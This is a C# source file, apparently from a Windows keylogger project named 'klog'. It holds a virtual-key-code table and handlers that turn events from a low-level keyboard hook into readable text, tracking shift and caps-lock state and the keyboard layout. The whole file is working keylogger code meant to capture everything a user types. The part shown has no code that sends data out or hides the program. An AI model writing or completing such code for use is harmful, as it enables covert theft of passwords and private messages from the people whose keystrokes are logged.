using Windows.Win32;
using Windows.Win32.UI.WindowsAndMessaging;

namespace klog;

public static class Keyboard
{
    private const uint VK_CAPSLOCK = 0x14;
    private const uint VK_LSHIFT = 0xA0;
    private const uint VK_RSHIFT = 0xA1;

    // reference https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
    private static readonly Dictionary<uint, string> VirtualKeyCodes = new()
    {
        { 0x08, " [BACKSPACE] " },
        { 0x09, $"{Environment.NewLine}[TAB] " },
        { 0x0C, $"{Environment.NewLine}[CLEAR] " },
        { 0x0D, $"{Environment.NewLine}[ENTER] " },
        { 0x10, $"{Environment.NewLine}[SHIFT] " },
        { 0x11, $"{Environment.NewLine}[CTRL] " },
        { 0x12, $"{Environment.NewLine}[ALT] " },
        { 0x13, $"{Environment.NewLine}[PAUSE] " },
        { 0x15, $"{Environment.NewLine}[IME Kana/Hangul mode] " },
        { 0x17, $"{Environment.NewLine}[IME On] " },
        { 0x18, $"{Environment.NewLine}[IME final mode] " },
        { 0x19, $"{Environment.NewLine}[IME Hanja/Kanji mode] " },
        { 0x1A, $"{Environment.NewLine}[IME Off] " },
        { 0x1B, $"{Environment.NewLine}[ESCAPE] " },
        { 0x1C, $"{Environment.NewLine}[IME convert] " },
        { 0x1D, $"{Environment.NewLine}[IME nonconvert] " },
        { 0x1E, $"{Environment.NewLine}[IME accept] " },
        { 0x1F, $"{Environment.NewLine}[IME mode change request] " },
        { 0x20, " [SPACE] " },
        { 0x21, $"{Environment.NewLine}[PAGE UP] " },
        { 0x22, $"{Environment.NewLine}[PAGE DOWN] " },
        { 0x23, $"{Environment.NewLine}[END] " },
        { 0x24, $"{Environment.NewLine}[HOME] " },
        { 0x25, $"{Environment.NewLine}[LEFT ARROW] " },
        { 0x26, $"{Environment.NewLine}[UP ARROW] " },
        { 0x27, $"{Environment.NewLine}[RIGHT ARROW] " },
        { 0x28, $"{Environment.NewLine}[DOWN ARROW] " },
        { 0x29, $"{Environment.NewLine}[SELECT] " },
        { 0x2A, $"{Environment.NewLine}[PRINT] " },
        { 0x2B, $"{Environment.NewLine}[EXECUTE] " },
        { 0x2C, $"{Environment.NewLine}[PRINT SCREEN] " },
        { 0x2D, $"{Environment.NewLine}[INSERT] " },
        { 0x2E, $"{Environment.NewLine}[DELETE] " },
        { 0x2F, $"{Environment.NewLine}[HELP] " },
        { 0x30, "0" },
        { 0x31, "1" },
        { 0x32, "2" },
        { 0x33, "3" },
        { 0x34, "4" },
        { 0x35, "5" },
        { 0x36, "6" },
        { 0x37, "7" },
        { 0x38, "8" },
        { 0x39, "9" },
        { 0x41, "a" },
        { 0x42, "b" },
        { 0x43, "c" },
        { 0x44, "d" },
        { 0x45, "e" },
        { 0x46, "f" },
        { 0x47, "g" },
        { 0x48, "h" },
        { 0x49, "i" },
        { 0x4A, "j" },
        { 0x4B, "k" },
        { 0x4C, "l" },
        { 0x4D, "m" },
        { 0x4E, "n" },
        { 0x4F, "o" },
        { 0x50, "p" },
        { 0x51, "q" },
        { 0x52, "r" },
        { 0x53, "s" },
        { 0x54, "t" },
        { 0x55, "u" },
        { 0x56, "v" },
        { 0x57, "w" },
        { 0x58, "x" },
        { 0x59, "y" },
        { 0x5A, "z" },
        { 0x5B, $"{Environment.NewLine}[LEFT WINDOWS KEY] " },
        { 0x5C, $"{Environment.NewLine}[RIGHT WINDOWS KEY] " },
        { 0x5D, $"{Environment.NewLine}[APPLICATIONS KEY] " },
        { 0x5F, $"{Environment.NewLine}[SLEEP] " },
        { 0x60, "[NUMPAD 0]" },
        { 0x61, "[NUMPAD 1]" },
        { 0x62, "[NUMPAD 2]" },
        { 0x63, "[NUMPAD 3]" },
        { 0x64, "[NUMPAD 4]" },
        { 0x65, "[NUMPAD 5]" },
        { 0x66, "[NUMPAD 6]" },
        { 0x67, "[NUMPAD 7]" },
        { 0x68, "[NUMPAD 8]" },
        { 0x69, "[NUMPAD 9]" },
        { 0x6A, $"{Environment.NewLine}[MULTIPLY] " },
        { 0x6B, $"{Environment.NewLine}[ADD] " },
        { 0x6C, $"{Environment.NewLine}[SEPARATOR] " },
        { 0x6D, $"{Environment.NewLine}[SUBTRACT] " },
        { 0x6E, $"{Environment.NewLine}[DECIMAL] " },
        { 0x6F, $"{Environment.NewLine}[DIVIDE] " },
        { 0x70, $"{Environment.NewLine}[F1] " },
        { 0x71, $"{Environment.NewLine}[F2] " },
        { 0x72, $"{Environment.NewLine}[F3] " },
        { 0x73, $"{Environment.NewLine}[F4] " },
        { 0x74, $"{Environment.NewLine}[F5] " },
        { 0x75, $"{Environment.NewLine}[F6] " },
        { 0x76, $"{Environment.NewLine}[F7] " },
        { 0x77, $"{Environment.NewLine}[F8] " },
        { 0x78, $"{Environment.NewLine}[F9] " },
        { 0x79, $"{Environment.NewLine}[F10] " },
        { 0x7A, $"{Environment.NewLine}[F11] " },
        { 0x7B, $"{Environment.NewLine}[F12] " },
        { 0x7C, $"{Environment.NewLine}[F13] " },
        { 0x7D, $"{Environment.NewLine}[F14] " },
        { 0x7E, $"{Environment.NewLine}[F15] " },
        { 0x7F, $"{Environment.NewLine}[F16] " },
        { 0x80, $"{Environment.NewLine}[F17] " },
        { 0x81, $"{Environment.NewLine}[F18] " },
        { 0x82, $"{Environment.NewLine}[F19] " },
        { 0x83, $"{Environment.NewLine}[F20] " },
        { 0x84, $"{Environment.NewLine}[F21] " },
        { 0x85, $"{Environment.NewLine}[F22] " },
        { 0x86, $"{Environment.NewLine}[F23] " },
        { 0x87, $"{Environment.NewLine}[F24] " },
        { 0x90, $"{Environment.NewLine}[NUM LOCK] " },
        { 0x91, $"{Environment.NewLine}[SCROLL LOCK] " },
        { 0xA0, $"{Environment.NewLine}[LEFT SHIFT] " },
        { 0xA1, $"{Environment.NewLine}[RIGHT SHIFT] " },
        { 0xA2, $"{Environment.NewLine}[LEFT CONTROL] " },
        { 0xA3, $"{Environment.NewLine}[RIGHT CONTROL] " },
        { 0xA4, " [LEFT ALT] " },
        { 0xA5, $"{Environment.NewLine}[RIGHT ALT] " },
        { 0xA6, $"{Environment.NewLine}[BROWSER BACK] " },
        { 0xA7, $"{Environment.NewLine}[BROWSER FORWARD] " },
        { 0xA8, $"{Environment.NewLine}[BROWSER REFRESH] " },
        { 0xA9, $"{Environment.NewLine}[BROWSER STOP] " },
        { 0xAA, $"{Environment.NewLine}[BROWSER SEARCH] " },
        { 0xAB, $"{Environment.NewLine}[BROWSER FAVOURITES] " },
        { 0xAC, $"{Environment.NewLine}[BROWSER START/HOME] " },
        { 0xAD, $"{Environment.NewLine}[VOLUME MUTE] " },
        { 0xAE, $"{Environment.NewLine}[VOLUME DOWN] " },
        { 0xAF, $"{Environment.NewLine}[VOLUME UP] " },
        { 0xB0, $"{Environment.NewLine}[NEXT TRACK] " },
        { 0xB1, $"{Environment.NewLine}[PREVIOUS TRACK] " },
        { 0xB2, $"{Environment.NewLine}[STOP MEDIA] " },
        { 0xB3, $"{Environment.NewLine}[PLAY/PAUSE MEDIA] " },
        { 0xB4, $"{Environment.NewLine}[START MAIL] " },
        { 0xB5, $"{Environment.NewLine}[SELECT MEDIA] " },
        { 0xB6, $"{Environment.NewLine}[START APPLICATION 1] " },
        { 0xB7, $"{Environment.NewLine}[START APPLICATION 2] " },
        { 0xBA, ";" },
        { 0xBB, "+" },
        { 0xBC, "," },
        { 0xBD, "-" },
        { 0xBE, "." },
        { 0xBF, "/" },
        { 0xC0, "`" },
        { 0xDB, "[" },
        { 0xDC, "\\" },
        { 0xDD, "]" },
        { 0xDE, "'" }
    };

    internal static unsafe string HandleKeyDown(KBDLLHOOKSTRUCT* kbStruct, ref bool shiftActive,
        ref bool capsLockActive)
    {
        var stringToWrite = GetStringToWrite(kbStruct, shiftActive, capsLockActive);

        UpdateShiftAndCapsLockState(kbStruct, ref shiftActive, ref capsLockActive);

        return stringToWrite;
    }

    internal static unsafe string HandleKeyUp(KBDLLHOOKSTRUCT* kbStruct, ref bool shiftActive)
    {
        var stringToWrite = kbStruct->vkCode switch
        {
            0xA0 => " [LEFT SHIFT UP] ",
            0xA1 => " [RIGHT SHIFT UP] ",
            0xA2 => " [LEFT CONTROL UP] ",
            0xA3 => " [RIGHT CONTROL UP] ",
            0xA4 => " [LEFT ALT UP] ",
            0xA5 => " [RIGHT ALT UP] ",
            _ => ""
        };

        // checking for shift keyup
        if (kbStruct->vkCode == VK_LSHIFT || kbStruct->vkCode == VK_RSHIFT) shiftActive = false;

        return stringToWrite;
    }

    /// <summary>
    ///     Gets current state of caps lock.
    /// </summary>
    /// <returns><c>True</c> if locked, <c>false</c> otherwise</returns>
    public static bool GetCapsLockState()
    {
        return PInvoke.GetAsyncKeyState(0x14) != 0;
    }

    /// <summary>
    ///     Gets the keyboard layout returned by GetKeyboardLayout function from user32.dll.
    /// </summary>
    /// <returns>
    ///     Hex string containing the language identifier. You can read more about it here:
    ///     https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-LCID/%5bMS-LCID%5d.pdf
    /// </returns>
    public static string GetKeyboardLayout()
    {
        var layout = PInvoke.GetKeyboardLayout(0);
        var lcid = layout >> 16;
        return $"0x{lcid:X4}";
    }

    private static unsafe string GetStringToWrite(KBDLLHOOKSTRUCT* kbStruct, bool shiftActive, bool capsLockActive)
    {
        if (VirtualKeyCodes.TryGetValue(kbStruct->vkCode, out var stringToWrite))
        {
            if (IsLetter(kbStruct->vkCode) && ShouldBeUppercase(shiftActive, capsLockActive))
                return stringToWrite.ToUpper();

            return stringToWrite;
        }

        if (kbStruct->vkCode == VK_CAPSLOCK) return capsLockActive ? " [CAPS LOCK OFF] " : " [CAPS LOCK ON] ";

        return stringToWrite ?? $"[CODE {kbStruct->vkCode}]";
    }

    private static bool IsLetter(uint vkCode)
    {
        return vkCode is >= 0x41 and <= 0x5A;
    }

    private static bool ShouldBeUppercase(bool shiftActive, bool capsLockActive)
    {
        return (shiftActive || capsLockActive) && !(shiftActive && capsLockActive);
    }

    private static unsafe void UpdateShiftAndCapsLockState(KBDLLHOOKSTRUCT* kbStruct, ref bool shiftActive,
        ref bool capsLockActive)
    {
        if (kbStruct->vkCode == VK_CAPSLOCK) capsLockActive = !capsLockActive;

        if (kbStruct->vkCode == VK_LSHIFT || kbStruct->vkCode == VK_RSHIFT) shiftActive = true;
    }
}